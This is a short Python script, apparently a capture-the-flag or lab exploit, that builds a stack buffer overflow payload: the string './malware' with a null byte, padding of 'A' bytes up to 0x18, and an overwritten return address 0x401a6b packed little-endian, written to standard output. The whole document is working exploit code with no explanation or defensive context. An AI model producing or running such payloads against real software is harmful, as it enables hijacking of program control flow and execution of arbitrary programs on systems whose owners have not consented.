import sys, struct

payload  = b"./malware\x00"
payload += b"A" * (0x18 - len(payload))
payload += struct.pack("<Q", 0x401a6b)

sys.stdout.buffer.write(payload)
